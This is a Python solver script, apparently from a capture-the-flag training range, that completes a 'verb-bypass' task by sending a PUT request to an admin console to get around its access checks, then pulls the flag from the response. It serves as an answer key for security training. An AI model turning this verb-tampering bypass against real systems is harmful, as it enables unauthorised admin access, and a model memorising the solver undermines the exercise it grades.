"""Intended-path solver: verb tampering on the admin console."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.put(f"{ctx.url()}/admin-console", timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="verb-bypass",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in response",
            )
        ]
    )
